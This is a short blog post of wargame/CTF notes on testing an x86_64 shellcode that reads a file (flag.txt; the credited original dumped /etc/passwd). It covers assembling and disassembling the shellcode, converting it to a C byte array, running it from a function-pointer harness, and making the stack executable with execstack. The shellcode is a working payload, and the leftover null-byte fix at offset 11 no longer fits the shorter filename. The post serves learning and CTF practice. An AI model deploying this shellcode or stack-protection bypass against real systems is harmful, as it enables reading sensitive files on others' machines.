+++
title = "Testing shellcodes"
author = "Victor Dorneanu"
date = "2016-08-23"
tags = ["c", "asm", "ctf", "wargames"]
category = "notes"
+++

While playing some [wargames](http://blog.dornea.nu/tag/wargames/) where I had to read a file called **flag.txt** using C code, one possible solution (unfortunately not the right one) was to use shellcodes to read the file and dump its content. Here are my notes for future use.

~~~.asm
BITS 64
; Author Mr.Un1k0d3r - RingZer0 Team
; Read /etc/passwd Linux x86_64 Shellcode
; Shellcode size 82 bytes
global _start
 
section .text
 
_start:
    jmp _push_filename
   
_readfile:
; syscall open file
    pop rdi ; pop path value
    ; NULL byte fix
    xor byte [rdi + 11], 0x41
       
    xor rax, rax
    add al, 2
    xor rsi, rsi ; set O_RDONLY flag
    syscall
       
; syscall read file
    sub sp, 0xfff
    lea rsi, [rsp]
    mov rdi, rax
    xor rdx, rdx
    mov dx, 0xfff; size to read
    xor rax, rax
    syscall
   
; syscall write to stdout
    xor rdi, rdi
    add dil, 1 ; set stdout fd = 1
    mov rdx, rax
    xor rax, rax
    add al, 1
    syscall
   
; syscall exit
    xor rax, rax
    add al, 60
    syscall
   
_push_filename:
    call _readfile
    path: db "flag.txt"
~~~


## Shellcode compilation


Compile using **nasm**:

~~~.shell
$ nasm -f elf64 shellcode.asm -o shellcode.o
~~~

## Disassemble

Now you can disassemble the object file using **objdump**:

~~~.shell
shellcode.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <_start>:
   0:   eb 3f                   jmp    41 <_push_filename>

0000000000000002 <_readfile>:
   2:   5f                      pop    %rdi
   3:   80 77 0b 41             xorb   $0x41,0xb(%rdi)
   7:   48 31 c0                xor    %rax,%rax
   a:   04 02                   add    $0x2,%al
   c:   48 31 f6                xor    %rsi,%rsi
   f:   0f 05                   syscall 
  11:   66 81 ec ff 0f          sub    $0xfff,%sp
  16:   48 8d 34 24             lea    (%rsp),%rsi
  1a:   48 89 c7                mov    %rax,%rdi
  1d:   48 31 d2                xor    %rdx,%rdx
  20:   66 ba ff 0f             mov    $0xfff,%dx
  24:   48 31 c0                xor    %rax,%rax
  27:   0f 05                   syscall 
  29:   48 31 ff                xor    %rdi,%rdi
  2c:   40 80 c7 01             add    $0x1,%dil
  30:   48 89 c2                mov    %rax,%rdx
  33:   48 31 c0                xor    %rax,%rax
  36:   04 01                   add    $0x1,%al
  38:   0f 05                   syscall 
  3a:   48 31 c0                xor    %rax,%rax
  3d:   04 3c                   add    $0x3c,%al
  3f:   0f 05                   syscall 

0000000000000041 <_push_filename>:
  41:   e8 bc ff ff ff          callq  2 <_readfile>

0000000000000046 <path>:
  46:   66 6c                   data16 insb (%dx),%es:(%rdi)
  48:   61                      (bad)  
  49:   67 2e 74 78             addr32 je,pn c5 <path+0x7f>
  4d:   74                      .byte 0x74

~~~

## Assembler to C

Now convert the opcodes to some C array:

~~~.shell
$ for i in $(objdump -d shellcode.o |grep "^ " |cut -f2); do echo -n '\\x'$i; done;echo
\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x66\x6c\x61\x67\x2e\x74\x78\x74
~~~

Now use this code:

~~~.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>

unsigned char code[] = \
"\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x66\x6c\x61\x67\x2e\x74\x78\x74";

int main(int argc, char **argv) {
    void (*fp) (void);
    fp = (void *)code;
    fp();
}

~~~


## C code compilation

... and compile it.

~~~.shell
$ gcc -O3 -Wall -fstack-protector-all -fPIE bin.c -o bin
bin.c: In function 'main':
bin.c:20:1: warning: control reaches end of non-void function [-Wreturn-type]
 }
~~~

## Make stack executable

The binary will segfault if executed. That's because the stack isn't executable:

~~~.shell
$ readelf -l bin | grep -C 2 GNU_STACK

  GNU_EH_FRAME   0x00000000000005e4 0x00000000004005e4 0x00000000004005e4
                 0x0000000000000034 0x0000000000000034  R      4
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     10
~~~

Let's make the stack executable:

~~~.shell
$ /usr/sbin/execstack -s bin
~~~

And finally run the executable:

~~~.shell
$ cat flag.txt
bla
$ ./bin
bla
~~~
